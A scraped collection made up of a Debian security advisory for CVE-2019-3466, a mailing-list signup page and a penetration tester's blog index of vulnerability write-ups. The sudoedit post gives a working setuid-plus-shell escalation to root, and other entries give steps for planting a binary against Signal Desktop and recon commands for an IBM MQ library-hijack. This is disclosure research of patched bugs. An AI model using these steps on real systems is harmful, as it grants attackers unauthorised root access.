=== Content from blog.mirch.io_b0d0c9b4_20250121_014553.html ===



=== Content from lists.ubuntu.com_be8ed54b_20250121_014605.html ===


| **ubuntu-hardened -- Ubuntu security discussion** | |
| --- | --- |
|  | |
| **About ubuntu-hardened** | English (USA)   Chinese (Taiwan) |
| Discussion on Ubuntu security updates, development of new security technologies, and general "hardening" of the operating system.  A place to talk about MAC systems (SELinux, AppArmor, Smack) in Ubuntu, about both kernel-level and user-land security improvements and technologies, etc.  To see the collection of prior postings to the list, visit the [ubuntu-hardened Archives](https://lists.ubuntu.com/archives/ubuntu-hardened). | |
| **Using ubuntu-hardened** | |
| To post a message to all the list members, send email to ubuntu-hardened@lists.ubuntu.com. You can subscribe to the list, or change your existing subscription, in the sections below. | |
| **Subscribing to ubuntu-hardened** | |
| Subscribe to ubuntu-hardened by filling out the following form. You will be sent email requesting confirmation, to prevent others from gratuitously subscribing you. This is a hidden list, which means that the list of members is available only to the list administrator.    | Your email address: |  |  | | --- | --- | --- | | Your name (optional): |  |  | | You may enter a privacy password below. This provides only mild security, but should prevent others from messing with your subscription. **Do not use a valuable password** as it will occasionally be emailed back to you in cleartext. If you choose not to enter a password, one will be automatically generated for you, and it will be sent to you once you've confirmed your subscription. You can always request a mail-back of your password when you edit your personal options. | | | | Pick a password: |  |  | | Reenter password to confirm: |  |  | | Which language do you prefer to display your messages? | English (USA)   Chinese (Taiwan) |  | | Would you like to receive list mail batched in a daily digest? | No  Yes | |  | | | | |

| **ubuntu-hardened Subscribers** | |
| (*The subscribers list is only available to the list administrator.*) Enter your admin address and password to visit the subscribers list: Admin address: Password:  To unsubscribe from ubuntu-hardened, get a password reminder, or change your subscription options enter your subscription email address: If you leave the field blank, you will be prompted for your email address | |

---

[ubuntu-hardened](../listinfo/ubuntu-hardened) list run by jamie at ubuntu.com, mdeslaur at ubuntu.com, sbeattie at ubuntu.com, alex.murray at canonical.com
[ubuntu-hardened administrative interface](../admin/ubuntu-hardened) (requires authorization)
[Overview of all lists.ubuntu.com mailing lists](../listinfo)

| [Delivered by Mailmanversion 2.1.20](http://www.gnu.org/software/mailman/index.html) | [Python Powered](http://www.python.org/) | [GNU's Not Unix](http://www.gnu.org/) | [Debian Powered](http://www.debian.org/) |
| --- | --- | --- | --- |

[![](http://tuxedo-es.org/images/hardened_debian.png)](http://www.debian-hardened.org)



=== Content from www.debian.org_f65a354b_20250121_014548.html ===


---

[[Date Prev](msg00219.html)][[Date Next](msg00221.html)]
[[Thread Prev](msg00219.html)][[Thread Next](msg00221.html)]
[[Date Index](maillist.html#00220)]
[[Thread Index](threads.html#00220)]

# [SECURITY] [DSA 4568-1] postgresql-common security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 4568-1] postgresql-common security update
* *From*: Moritz Muehlenhoff <jmm@debian.org>
* *Date*: Thu, 14 Nov 2019 21:35:28 +0000
* *Message-id*: <[[üîé]](/msgid-search/20191114213528.g2hc567ohvcrogyy%40seger.debian.org)¬†[20191114213528.g2hc567ohvcrogyy@seger.debian.org](msg00220.html)>
* *Reply-to*: debian-security-announce-request@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-4568-1                   security@debian.org
<https://www.debian.org/security/>                       Moritz Muehlenhoff
November 14, 2019                     <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : postgresql-common
CVE ID         : CVE-2019-3466

Rich Mirch discovered that the pg_ctlcluster script didn't drop
privileges when creating socket/statistics temporary directories, which
could result in local privilege escalation.

For the oldstable distribution (stretch), this problem has been fixed
in version 181+deb9u3.

For the stable distribution (buster), this problem has been fixed in
version 200+deb10u3.

We recommend that you upgrade your postgresql-common packages.

For the detailed security status of postgresql-common please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/postgresql-common>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEEtuYvPRKsOElcDakFEMKTtsN8TjYFAl3Nxw8ACgkQEMKTtsN8
TjZLpg/7BYZxfcxlC7pD5xDeCuibl8fmqOQo7+fT5LJnnnaGVroy9B4bGf9MaIgx
9aHis3FofPc0I2OQV9S+XaaPvcggrFO9TlmErJaLXRqxjAFjalOxC1jsWu1J0rhz
HV4ZrOUfkE06AuDcVjVfI7u8W+R+xuYkqIlFhirZ4xGGBUtrZXQOTNgBaZmqrlEX
VBnd22L/dxIVeWF2hFU94WldY5Ywx6ouy1gxAT7KiC6JTqjDOqbyVaX10Ivw8i5w
S7+AEDssIkkuoOyNeRtULBT3ghXIskBPlKLI0tafQnp4Yrvhz/CRqlEmqA5Frfdw
82d+bmmMQv0wNN6j742IpTn6Xz9NiSRlLTG098HPv5eQ6aPvCNPx+BRYrFHtfeWh
cV73TkpeX6Hsyxnb1srP5Yy76oxK8milRcNDbkh3zN7q2pnCVL9F1Hco0UxcqY7D
yw8c+c0xJClUKJScSFO+fpA4XyE3M0YPkGz6tms3ham7pGE7tkPfcWKKTvs4qWB6
VObGlINKnTvGvlodTTUWmoLHZEmiUX5wOThHbXBoPbE1P20dJL+6xWIy6T7Zq7xp
YWWBSFnwBiEL4v1CuKH/JZEabHqeXLtOKEA2qZNlmL0DX71vDOYsFIHUFjZB/SP1
vl61tjilvFHM8uvWx5CATWQnz0ajMtkoAC76X4mNJxc8jM6pKNY=
=HLzY
-----END PGP SIGNATURE-----

```

---



=== Content from blog.mirch.io_13739932_20250121_014558.html ===

[Skip to content](#content)

* [Home](/)
* [Vulnerability Research](https://blog.mirch.io/cve/)
* [Github](https://github.com/mirchr/security-research)
* [Twitter](https://twitter.com/0xm1rch)
* [About](https://blog.mirch.io/about/)

Search for:

[Rich Mirch](https://blog.mirch.io "Rich Mirch")
# [Rich Mirch](https://blog.mirch.io/ "Rich Mirch")

## Penetration Tester, Red Teamer, Security Researcher

Menu

[Exploiting Kaseya Unitrends Backup Appliance ‚Äì Part¬†1 ‚Äî May 20, 2022](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/ "Exploiting Kaseya Unitrends Backup Appliance ‚Äì Part¬†1")

## [Exploiting Kaseya Unitrends Backup Appliance ‚Äì Part¬†1](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/)

[May 20, 2022May 20, 2022](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/ "9:50 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

![](https://blog.mirch.io/wp-content/uploads/2022/05/unitrends-woot.png?w=889)

In 2021 I discovered several high and critical vulnerabilities in the [Kaseya Unitrends](https://www.unitrends.com/products/unitrends-backup-appliances) backup appliance. This research was conducted and published as part of my day job. Part one details a chain of vulnerabilities by leveraging an insecure [PostgreSQL](https://www.postgresql.org/) database to ultimately gain shell access to the remote server. Visit <https://www.cyberonesecurity.com/blog/exploiting-kaseya-unitrends-backup-appliance-part-1> for the the full write-up. Stay tuned for part two.

[sudoedit symlink fix for CVE-2021-23240 introduced new¬†vulnerability ‚Äî January 25, 2021](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "sudoedit symlink fix for CVE-2021-23240 introduced new¬†vulnerability")

[![](https://blog.mirch.io/wp-content/uploads/2021/01/image-10.png?w=712)](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "sudoedit symlink fix for CVE-2021-23240 introduced new¬†vulnerability")

## [sudoedit symlink fix for CVE-2021-23240 introduced new¬†vulnerability](https://blog.mirch.io/2021/01/25/sudoedit-lpe/)

[January 25, 2021January 25, 2021](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "8:43 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

I noticed the following changelog entry in sudo [1.9.5p1.](https://www.sudo.ws/stable.html#1.9.5p1) This caught my attention so I decided to look further. I was unable to find an advisory, PoC, or CVE for this vulnerability. Using the details from the changelog message and fix, I decided to write an exploit for it.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image.png?w=1024)

Using an Ubuntu 20.04.1 VM, I created a low privileged user named ‚Äúlowpriv‚Äù and added a sudoedit rule for a root owned file /etc/test.txt. I also downloaded the [source](https://github.com/sudo-project/sudo/archive/SUDO_1_9_5.tar.gz) for sudo 1.9.5, compiled it, and installed it to /opt/sudo.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-3.png?w=1024)

Show sudoedit rule.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-1.png?w=1024)

Show the sudo version is 1.9.5.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-2.png?w=1024)

With the test environment ready I ran sudoedit /etc/test.txt. I executed !id as a quick test which executes the id command in a shell however privileges are dropped by bash when the UID != EUID. Back to the drawing board.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-5.png?w=1024)

I was able to successfully edit arbitrary files simply using the :e /etc/sudoers or :e /etc/shadow commands to escalate privileges, however that was too easy.

Looking for esoteric features that could potentially be leveraged, I discovered the libcall and libcallnr functions which allow you to execute a function from an external library. The one caveat is there can only be a single argument. There are a crazy amount of functions available to vim that I never realized. Check out <https://vim.help/41-write-a-vim-script#41.6> for the full listing.

I tried calling a variety of functions with varying degrees of success but found a simple method by calling [setuid()](https://man7.org/linux/man-pages/man2/setuid.2.html) directly.

`call libcallnr("libc.so.6","setuid",0)`

After running sudoedit, use the following vim/ex command to change the UID to zero. This will ensure that shelling out will retain privileges because now UID==EUID.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-8.png?w=1024)

Execute a bash shell with !bash.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-9.png?w=198)

Interactive root shell obtained. Woot!

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-10.png?w=1024)

I tested the same proof of concept with 1.9.5p1 and sudoedit properly drops privileges as expected.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-11.png?w=1024)

**Summary**

If you upgraded to sudo 1.9.5 to fix [CVE-2021-23240](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23240) or [CVE-2021-23239](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23239), a new privilege escalation vulnerability was introduced in sudoedit and you should upgrade to 1.9.5p1.

Once in a while I look at recently fixed vulnerabilities to see if I can bypass the fix. In this case, the sudo project knew about this vulnerably but to my knowledge no advisory or CVE was created. I think this is odd that the issue was not communicated since a valid privilege escalation was patched. It‚Äôs unclear if another researcher reported it or if maintainers discovered it during their own testing. I also could not find a proof of concept so I decided to write one as a fun exercise.

I hope you enjoyed the short write up. Hit me me up on Twitter [@0xm1rch](https://twitter.com/0xm1rch) if you have any questions or comments.

[Pi-hole Patches Critical Stored XSS¬†Vulnerability ‚Äî December 24, 2020](https://blog.mirch.io/2020/12/24/pihole-xss/ "Pi-hole Patches Critical Stored XSS¬†Vulnerability")

[![](https://blog.mirch.io/wp-content/uploads/2020/12/piholexss.png?w=641)](https://blog.mirch.io/2020/12/24/pihole-xss/ "Pi-hole Patches Critical Stored XSS¬†Vulnerability")

## [Pi-hole Patches Critical Stored XSS¬†Vulnerability](https://blog.mirch.io/2020/12/24/pihole-xss/)

[December 24, 2020December 24, 2020](https://blog.mirch.io/2020/12/24/pihole-xss/ "10:03 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

Pi-hole v5.2.1 is vulnerable to a critical stored cross site scripting vulnerability. An attacker with the ability to directly or indirectly query DNS with a malicious hostname can cause arbitrary JavaScript to execute when the Pi-hole administrator accesses the Query Log or Long-term Query Log pages on the web portal.

The Pi-hole project released a fix on 12/24/2020 in v5.2.2. Shodan reports over 7,500 Pi-hole instances. This could be remotely exploited if these instances permit external DNS queries. Other possibilities may exist if a malformed DNS query is allowed.

No payloads are being published at this time to give users time to patch.

**References**

* <https://github.com/pi-hole/AdminLTE/pull/1665>

**Timeline**

* 12/16/2020 Vulnerability reported to vendor
* 12/18/2020 Vendor acknowledged receipt of report
* 12/22/2020 Discovered a second XSS payload that would fire on the Long-term Queries Page
* 12/23/2020 Mitre assigns CVE-2020-35659
* 12/24/2020 Vendor released fix in v5.2.2

[Metasploit module developed for CVE-2018-18556 VyOS Privilege¬†Escalation ‚Äî September 25, 2020](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/ "Metasploit module developed for CVE-2018-18556 VyOS Privilege¬†Escalation")

## [Metasploit module developed for CVE-2018-18556 VyOS Privilege¬†Escalation](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/)

[September 25, 2020September 25, 2020](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/ "3:52 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

Today, a Metasploit module was merged for a vulnerability I found in 2018 with [VyOS](https://www.vyos.io/). This vulnerability was my first public InfoSec blog post. I appreciate [bcoles](https://github.com/bcoles) for developing the [exploit/linux/ssh/vyos\_restricted\_shell\_privesc](https://github.com/rapid7/metasploit-framework/pull/14123) module. Read the [Metasploit Wrapup for 9/25/2020](https://blog.rapid7.com/2020/09/25/metasploit-wrap-up-80/). The full write-up can can be found on this blog at [C](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/)[VE-2018-18556 ‚Äì VyOS Privilege escalation via sudo pppd for operator¬†users](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/).

[Critical Vulnerabilities Discovered in MoFi¬†Routers ‚Äî September 2, 2020](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/ "Critical Vulnerabilities Discovered in MoFi¬†Routers")

## [Critical Vulnerabilities Discovered in MoFi¬†Routers](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/)

[September 2, 2020](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/ "1:08 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

I discovered several vulnerabilities in the MoFi4500 LTE router. Several vulnerabilities have not been patched, including an unauthenticated remote command injection and several undocumented backdoors. The full write-up can be viewed at <https://www.criticalstart.com/critical-vulnerabilities-discovered-in-mofi-routers/>.

Media Coverage

* <https://www.cyberscoop.com/mofi-networks-routers-zero-day-critical-start/>
* <https://www.zdnet.com/article/backdoors-left-unpatched-in-mofi-routers/>

Follow the conversation on Twitter

> The team is at it again! This time with 10 [#0days](https://twitter.com/hashtag/0days?src=hash&ref_src=twsrc%5Etfw) found by [@0xm1rch](https://twitter.com/0xm1rch?ref_src=twsrc%5Etfw) for routers from [@MoFiNetwork](https://twitter.com/MoFiNetwork?ref_src=twsrc%5Etfw). After coordinating with others to reduce impact there still appears to be over 6,860 vulnerable devices externally facing.[#Infosec](https://twitter.com/hashtag/Infosec?src=hash&ref_src=twsrc%5Etfw) [#redteam](https://twitter.com/hashtag/redteam?src=hash&ref_src=twsrc%5Etfw)<https://t.co/1A1UgRmJrq> [pic.twitter.com/YKPiF4LFMq](https://t.co/YKPiF4LFMq)
>
> ‚Äî TeamARES (@TeamAresSec) [September 2, 2020](https://twitter.com/TeamAresSec/status/1301200248417775618?ref_src=twsrc%5Etfw)

[CVE-2020-3950 VMware Fusion Elevation of¬†Privilege ‚Äî March 17, 2020](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "CVE-2020-3950 VMware Fusion Elevation of¬†Privilege")

[![](https://blog.mirch.io/wp-content/uploads/2020/03/vmware-fusion-cve-2020-3950-cropped.png?w=712)](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "CVE-2020-3950 VMware Fusion Elevation of¬†Privilege")

## [CVE-2020-3950 VMware Fusion Elevation of¬†Privilege](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/)

[March 17, 2020April 3, 2020](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "10:55 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

VMware Fusion 11.5.~~1~~2 and prior are vulnerable to an elevation of privilege vulnerability. For more details please review the advisory and proof of concept on my Github page [CVE-2020-3950.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2020-3950.sh). VMware released a the patch last week and a public advisory [VMSA-2020-0005](https://www.vmware.com/security/advisories/VMSA-2020-0005.html) today however it has been determined that the patch does not properly fix the vulnerability. I reached out to the VMware security team and received a response at 10:31 UTC 2020-03-18 ‚Äì ‚ÄúWe are aware of the situation and working on the next steps‚Äù.

I also learned today that [Jeff Ball](https://twitter.com/jeffball55) at [GRIMM](https://twitter.com/grimmcyber) also independently discovered and reported the vulnerability to VMware.¬† This is a first for me. Make sure to read their excellent detailed write-up <https://blog.grimm-co.com/post/analyzing-suid-binaries/>. You can also follow the thread on Twitter.

> PoC for CVE-2020-3950 VMware Fusion EoP. <https://t.co/F0jGnE9BZu> Vendor Advisory: <https://t.co/28f3aoAFsG> [pic.twitter.com/5WYG9xg5cv](https://t.co/5WYG9xg5cv)
>
> ‚Äî Rich Mirch (@0xm1rch) [March 17, 2020](https://twitter.com/0xm1rch/status/1240030085450731521?ref_src=twsrc%5Etfw)

### **Related Articles**

* BleepingComputer [VMware Fixes High Severity Privilege Escalation Bug in Fusion](https://www.bleepingcomputer.com/news/security/vmware-fixes-high-severity-privilege-escalation-bug-in-fusion/)
* ZDNet [VMware patches privilege escalation vulnerability in Fusion, Horizon](https://www.zdnet.com/article/vmware-patches-privilege-escalation-vulnerability-in-workstation-fusion-horizon/)
* SecurityWeek [VMware Fixes Privilege Escalation Vulnerability in Fusion for Mac](https://www.securityweek.com/vmware-fixes-privilege-escalation-vulnerability-fusion-mac)
* SecurityWeek [Patch for Recently Disclosed VMware Fusion Vulnerability Incomplete](https://www.securityweek.com/recent-patch-vmware-fusion-vulnerability-incomplete)
* SecurityWeek [VMware Again Fails to Patch Privilege Escalation Vulnerability in Fusion](https://www.securityweek.com/vmware-again-fails-patch-privilege-escalation-vulnerability-fusion)
* Metasploit Module [Blown up by your own Fusion bomb](https://blog.rapid7.com/2020/04/03/metasploit-wrap-up-58/)

[CVE-2019-19954 Signal Desktop Windows Elevation of Privilege¬†Vulnerability ‚Äî December 18, 2019](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/ "CVE-2019-19954 Signal Desktop Windows Elevation of Privilege¬†Vulnerability")

## [CVE-2019-19954 Signal Desktop Windows Elevation of Privilege¬†Vulnerability](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/)

[December 18, 2019August 6, 2020](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/ "7:25 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

# Vulnerability Summary

Signal Desktop v1.29 on Windows is vulnerable to an elevation of privilege vulnerability. During the startup the application will execute the c:\node\_modules\.bin\wmic.exe binary if it exists. By default on Windows, low privileged users have the privilege to create folders under root level drives. A low privileged user can create a malicious wmic.exe which will be executed every time Signal Desktop starts by any user of the system. The malicious binary is executed in the background without the users knowledge. This is an example of horizontal [privilege escalation](https://en.wikipedia.org/wiki/Privilege_escalation).

The vulnerability has been patched in v1.29.1 in commit [2da39c](https://github.com/signalapp/Signal-Desktop/commit/2da39cca673cc11be3c6d70d4fb95889f9ab6688) which was released 12/17/2019. Kudos to the Signal security team for fixing in less than two weeks! Unfortunately, at this time the they do not feel this warrants an advisory or CVE so the vulnerability was silently fixed. **12/24/2019 Update:** Mitre assigned CVE-2019-19954

## Steps To Reproduce

In a cmd window

```
mkdir c:\node_modules\.bin
copy c:\windows\system32\calc.exe c:\node_modules\.bin\wmic.exe

```

Now any user that opens Signal, the Windows calculator will be popped.

## PoC

![signal-lpe-3](https://blog.mirch.io/wp-content/uploads/2020/08/signal-lpe-3.png)

## Timeline

* 2019-12-05: Report sent to Signal security team
* 2019-12-11: Reached out to Signal to verify report was received
* 2019-12-16: Signal acknowledges report
* 2019-12-17: Signal v1.29.1 released
* 2019-12-18: Published this blog post
* 2019-12-24: MITRE assigned CVE-2019-19954

## References

* Commit: [2da39c](https://github.com/signalapp/Signal-Desktop/commit/2da39cca673cc11be3c6d70d4fb95889f9ab6688)
* Vulnerable version: <https://updates.signal.org/desktop/signal-desktop-win-1.29.0.exe>

[CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg\_ctlcluster ‚Äî November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg_ctlcluster")

[![](https://blog.mirch.io/wp-content/uploads/2019/11/debian-buster-postgres-root.png?w=712)](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg_ctlcluster")

## [CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg\_ctlcluster](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/)

[November 15, 2019November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "6:54 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

# Vulnerability Summary

The [pg\_ctlcluster](https://manpages.debian.org/buster/postgresql-common/pg_ctlcluster.1.en.html) script in the postgresql-common package in Debian and Ubuntu is vulnerable to a local privilege escalation attack. pg\_ctlcluster is a script used to manage PostgreSQL instances.¬†A malicious actor with access to the postgres account can create arbitrary directories during startup or reload when called via systemd. This vulnerability can be leveraged to escalate privileges to root.

It‚Äôs important to note this is not a vulnerability in PostgreSQL and is specific to Debian, Ubuntu, or any system that consumes the Debian postgresql-common package.

A [fix](https://salsa.debian.org/postgresql/postgresql-common/commit/ec9d984b62ed79f61be97b786a9ff4381309979c)¬†is now available. Administrators should upgrade to the latest version of the postgresql-common package. See the Debian [security tracker](https://security-tracker.debian.org/tracker/source-package/postgresql-common) for details.

The vulnerability appears to have existed since 2013 based on the Debian Git history ([9dc97b,](https://salsa.debian.org/postgresql/postgresql-common/commit/9dc97be33f1f116ae6e2f17bd05cb6a2baf274a9)¬†[e97d16](https://salsa.debian.org/postgresql/postgresql-common/commit/e97d163c85c6df7e30ecc346eec007da2cd7e688)). I attempted to reproduce it on Wheezy but was unable to verify it due to unrelated technical issues standing up a test environment.

This proof of concept will show the ability to gain root privileges using the default

installation of¬† postgresql-common v200+deb10u2 along with postgresql-11 on Debian Buster. I have also verified the vulnerability on Ubuntu 19.04 with version 199 of the postgresql-common package.

---

## Walkthrough

The postgresql init script(/etc/init.d/postgresql) sources¬†[init.d-functions](https://salsa.debian.org/postgresql/postgresql-common/blob/master/debian/init.d-functions) which contain functions that call the pg\_ctlcluster script.¬†pg\_ctlcluster loads the following configuration files determined by the [Pgcommon](https://salsa.debian.org/postgresql/postgresql-common/blob/master/PgCommon.pm)¬†module.

* /etc/postgresql/cluster-version/cluster-name/pg\_ctl.conf
* /etc/postgresql/cluster-version/cluster-name/postgresql.conf
* /var/lib/postgresql/cluster-version/cluster-name/postgresql.auto.conf

These files are owned by the postgres user. The postgresql.auto.conf file will override the settings from /etc/postgresql. This file is created when the [alter system](https://www.postgresql.org/docs/current/sql-altersystem.html) command is executed.

pg\_ctlcluster contains logic to create directories for socketdir(defined in pg\_ctl.conf) and stats\_temp\_directory(defined in postgresql.conf). During a start or reload, if the directories defined in either of these variables do not exist, pg\_ctlcluster will create it and set the owner to the postgres user.

[Continue reading ‚Üí](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/#more-333)

[CVE-2018-1792 ‚Äì IBM MQ Privilege Escalation: Fun with¬†RUNPATH ‚Äî August 25, 2019](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "CVE-2018-1792 ‚Äì IBM MQ Privilege Escalation: Fun with¬†RUNPATH")

[![](https://blog.mirch.io/wp-content/uploads/2019/08/mqm-woot-4.png?w=712)](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "CVE-2018-1792 ‚Äì IBM MQ Privilege Escalation: Fun with¬†RUNPATH")

## [CVE-2018-1792 ‚Äì IBM MQ Privilege Escalation: Fun with¬†RUNPATH](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/)

[August 25, 2019August 25, 2019](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "11:37 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")/[Leave a comment](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/#respond)

# Vulnerability Summary

[IBM MQ](https://en.wikipedia.org/wiki/IBM_MQ)¬†for Linux and UNIX systems is vulnerable to a privilege escalation attack by forcing a setuid root binary to load a malicious library. A local attacker with access to the mqm account can execute arbitrary code as root. In October 2018 IBM published an [advisory](https://www-01.ibm.com/support/docview.wss?uid=ibm10734447)¬†along with patches for several versions.

The goal of this post is to show how the [RPATH/RUNPATH](https://en.wikipedia.org/wiki/Rpath)¬†value could potentially be leveraged for privilege escalation. When specified at compile time this path is embedded in the binary and is the first path searched when searching for a library if the dependent library specified does contain a slash. Details on how this works can be found in the [ld.so](http://man7.org/linux/man-pages/man8/ld.so.8.html)¬†man page.

As with most file path type vulnerabilities, if you control the path, you may control the application in some way. In this case the mqm user is the owner of the directories listed in the RUNPATH.

---

## Walkthrough

List setuid root applications.

```
[mqm@localhost]$ find /opt/mqm -perm -4000 -user root|xargs ls -l
-r-sr-x---. 1 root mqm 13384 Jul 9 07:09 /opt/mqm/bin/security/amqoamax
-r-sr-x---. 1 root mqm 13704 Jul 9 07:09 /opt/mqm/bin/security/amqoampx

```

Use¬†[readelf](http://man7.org/linux/man-pages/man1/readelf.1.html)¬†to read the dynamic section to extract the RPATH/RUNPATH.

```
[mqm@localhost ~]$ readelf -d /opt/mqm/bin/security/amqoamax |grep -e RPATH -e RUNPATH
0x000000000000001d (RUNPATH) Library runpath: [/opt/mqm/lib64:/opt/mqm/gskit8/lib64:/

```

Using my favorite utility [strace](http://man7.org/linux/man-pages/man1/strace.1.html), we can see the open() calls for libm.so.6 fails with ENOENT under /opt/mqm/lib64 and /opt/mqm/gskit8.¬† We‚Äôre using libm.so.6 for this PoC but other libraries can be used. The dependency is ultimately resolved at /usr/lib64/libm.so.6. This gets interesting because the mqm user owns the directories under /opt/mqm.

```
[mqm@localhost ~]$ strace -f /opt/mqm/bin/security/amqoamax 2>&1|grep libm.so
open("/opt/mqm/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/opt/mqm/gskit8/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/usr/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = 3

```

[Continue reading ‚Üí](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/#more-165)

[CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL¬†Engine ‚Äî June 10, 2019](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL¬†Engine")

[![](https://blog.mirch.io/wp-content/uploads/2019/06/woot-cmd.png?w=659)](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL¬†Engine")

## [CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL¬†Engine](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/)

[June 10, 2019June 20, 2019](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "7:13 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")/[1 Comment](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/#comments)

## **Vulnerability Summary**

During startup the PIA Windows service(pia-service.exe) loads the OpenSSL library from C:\Program Files\Private Internet Access\libeay32.dll. This library attempts to load the C:\etc\ssl\openssl.cnf configuration file. By default on Windows systems, authenticated users can create directories under C:\. A low privileged user can create a openssl.cnf configuration file to load a malicious OpenSSL engine library resulting in the arbitrary code execution as SYSTEM when the service starts.

The root cause is when the OpenSSL libraries were built, the [OPENSSLDIR](https://wiki.openssl.org/index.php/Compilation_and_Installation#PREFIX_and_OPENSSLDIR)¬†parameter was set to a path which a low privileged user can modify or create. I believe this issue is lurking in many Window applications that bundle OpenSSL libraries. I have discovered the same vulnerability in several other Windows applications and will be disclosing those findings when patches are available.

I created a simple tool to help identify potentially vulnerable OpenSSL libraries ‚Äì<https://github.com/mirchr/openssldir_check>.

